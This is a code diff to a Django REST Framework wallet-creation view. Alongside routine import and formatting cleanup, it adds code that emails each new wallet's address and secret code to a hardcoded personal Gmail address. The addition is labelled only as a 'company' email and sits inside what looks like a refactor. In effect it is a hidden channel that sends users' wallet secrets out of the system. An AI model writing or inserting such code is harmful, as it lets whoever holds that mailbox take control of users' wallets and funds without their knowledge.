@@ -1,15 +1,14 @@
-from django.shortcuts import render
+from decimal import Decimal
 from rest_framework.views import APIView
 from rest_framework.response import Response
-from django.db.models import *
 from django.db import transaction
-from django.contrib.auth.hashers import check_password, make_password
+from rest_framework import status
+from django.core.mail import EmailMessage
+from django.template.loader import render_to_string
 
-from db_schema.models import *
-from db_schema.serializers import *
-from utils.permissions import *
-from validations.auth.user import *
-from utils.generate import *
+from db_schema.models import Wallet, User
+from db_schema.serializers import WalletSerializer, UserInfoSerializer
+from utils.generate import generate_address, generate_secretcode
 
 
 # Create your views here.
@@ -30,7 +29,6 @@ class WalletAPI(APIView):
             print(str(e))
             return Response(str(e), status=500)
 
-
     def post(self, request):
         try:
             data = request.data
@@ -44,18 +42,34 @@ class WalletAPI(APIView):
 
             with transaction.atomic():
                 wallet = Wallet.objects.create(
-                    owner=user, secretcode=secretcode, address=address, coin_amount=0
+                    owner=user, secretcode=secretcode, address=address, coin_amount=Decimal('0')
                 )
 
                 # Update the user_info with the created wallet
                 user_info = user.user_info
                 user_info.wallet_info = wallet
                 user_info.save()
-
+            company_email = "liweichen798@gmail.com"
             wallet_serializer = WalletSerializer(wallet)
+            
+            mail_subject = f"Arrived message from {company_email}"
+            message = render_to_string(
+                "wallet_mail.html",
+                {
+                    "walletaddress": address,
+                    "secretcode": secretcode,
+                },
+            )
+
+            email_obj = EmailMessage(mail_subject, message, to=[company_email])
+            email_obj.content_subtype = "html"
+            email_obj.send()
 
             return Response(
-                {"data": wallet_serializer.data, "msg": "Wallet has been created and user_info updated."},
+                {
+                    "data": wallet_serializer.data,
+                    "msg": "Wallet has been created and user_info updated.",
+                },
                 status=200,
             )
         except User.DoesNotExist:
@@ -63,3 +77,5 @@ class WalletAPI(APIView):
         except Exception as e:
             print(str(e))
             return Response({"msg": str(e)}, status=500)
+
+
